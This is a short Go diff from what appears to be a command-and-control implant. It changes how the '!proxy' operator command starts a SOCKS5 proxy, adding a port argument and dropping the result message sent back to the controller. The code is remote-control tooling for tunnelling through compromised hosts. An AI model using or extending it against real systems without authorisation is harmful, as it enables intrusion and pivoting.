@@ -90,18 +90,17 @@ func processCCData(data *MsgTunData) {
 
 		// proxy server
 		if cmdSlice[0] == "!proxy" {
-			if len(cmdSlice) != 2 {
+			if len(cmdSlice) != 3 {
 				log.Printf("args error: %s", cmdSlice)
 				return
 			}
 			log.Printf("Got proxy request: %s", cmdSlice)
-			err = Socks5Proxy(cmdSlice[1])
-			out = fmt.Sprintf("Success")
+			port := cmdSlice[2]
+			err = Socks5Proxy(cmdSlice[1], port)
 			if err != nil {
-				out = fmt.Sprintf("Failed to execute your command: %v", err)
+				log.Printf("Failed to start Socks5Proxy: %v", err)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-			goto send
+			return
 		}
 
 		// port fwd
